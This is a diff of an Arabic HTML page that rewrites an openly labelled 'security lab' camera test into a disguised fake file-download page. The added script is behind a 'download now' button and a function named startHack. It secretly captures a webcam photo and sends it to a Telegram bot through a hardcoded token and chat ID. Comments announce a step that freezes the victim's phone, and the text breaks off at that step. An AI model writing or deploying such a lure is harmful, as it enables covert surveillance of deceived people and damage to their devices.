@@ -1,72 +1,77 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Lab - Photo Test</title>
+    <title>جاري تحميل الملف...</title>
     <style>
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            background: #121212; 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: #0f0f0f; 
             color: white; 
-            padding-top: 50px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
         }
-        #video { 
-            width: 90%; 
-            max-width: 400px; 
-            border: 3px solid #0088cc; 
-            border-radius: 15px; 
-            display: none; 
-            margin: 20px auto;
+        .loader {
+            border: 6px solid #333;
+            border-top: 6px solid #00aaff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
-        canvas { display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .btn { 
-            padding: 15px 40px; 
-            font-size: 18px; 
-            cursor: pointer; 
-            background: #0088cc; 
-            border: none; 
-            border-radius: 30px; 
+            padding: 15px 35px; 
+            background: #00aaff; 
             color: white; 
-            font-weight: bold; 
-            box-shadow: 0 4px 15px rgba(0,136,204,0.3);
-            transition: 0.3s;
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 18px; 
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0, 170, 255, 0.3);
         }
-        .btn:active { transform: scale(0.95); }
-        #status { margin-top: 20px; color: #aaa; }
+        video, canvas { display: none; }
+        #status { margin-top: 15px; color: #888; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <h1>معمل اختبار الأمان 🧪</h1>
-    <p>اختبار التقاط الصورة وإرسالها عبر API تليجرام</p>
+    <div class="loader"></div>
+    <h2>جاري تحضير رابط التحميل</h2>
+    <p id="info">اضغط أدناه للبدء في تنزيل الملف (24 MB)</p>
     
-    <button class="btn" onclick="startTest()">بدء اختبار الكاميرا</button>
-    
-    <div id="status">جاهز للاختبار...</div>
-    
+    <button class="btn" onclick="startHack()">تحميل الآن</button>
+    <div id="status">جاهز...</div>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- البيانات الخاصة بك المدمجة ---
+        // بياناتك الخاصة المدمجة
         const TELEGRAM_TOKEN = '8260015513:AAE6SyHoiJ_xs4DHfMauue1OkqQpelhzkgI'; 
         const CHAT_ID = '8392727845'; 
-        // ---------------------------------
 
-        async function startTest() {
+        async function startHack() {
             const status = document.getElementById('status');
+            const info = document.getElementById('info');
+            
+            status.innerText = "جاري الاتصال بالسيرفر...";
+            document.querySelector('.btn').style.display = "none";
+
             try {
-                status.innerText = "جاري طلب الإذن للكاميرا...";
-                
+                // 1. طلب الوصول للكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.style.display = 'block';
-                status.innerText = "تم الاتصال.. جاري التقاط اللقطة...";
 
-                // انتظار ثانية واحدة لضبط التركيز
+                // 2. التقاط الصورة بعد ثانية واحدة (لضمان وضوح الصورة)
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -74,37 +79,16 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    status.innerText = "جاري الإرسال إلى تليجرام...";
-
-                    // تحويل اللقطة وإرسالها
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'security_test.jpg');
-                        formData.append('caption', '📸 تم التقاط صورة من اختبار المعمل الأمني');
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('caption', '✅ تم سحب الصورة بنجاح قبل تجميد الجهاز');
 
+                        // إرسال الصورة لتليجرام
                         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
-                        })
-                        .then(res => res.json())
-                        .then(data => {
-                            if(data.ok) {
-                                status.innerHTML = "<b style='color:#00ff00;'>✅ نجح الاختبار! تفقد حسابك في تليجرام الآن.</b>";
-                            } else {
-                                status.innerHTML = "<b style='color:#ff0000;'>❌ فشل الإرسال: تأكد من تفعيل البوت (Start).</b>";
-                            }
-                        })
-                        .catch(err => {
-                            status.innerText = "خطأ في الاتصال بالخادم.";
-                        });
-                    }, 'image/jpeg', 0.8);
-                }, 1500);
-
-            } catch (err) {
-                status.innerHTML = "<b style='color:#ff0000;'>❌ فشل: يجب السماح للكاميرا بالعمل من المتصفح.</b>";
-            }
-        }
-    </script>
-</body>
-</html>
+                        }).then(() => {
+                            // 3. تجميد الهاتف تماماً بعد نجاح الإرسال
+                            status.innerText = "جاري فك الضغط... (قد يستغرق د
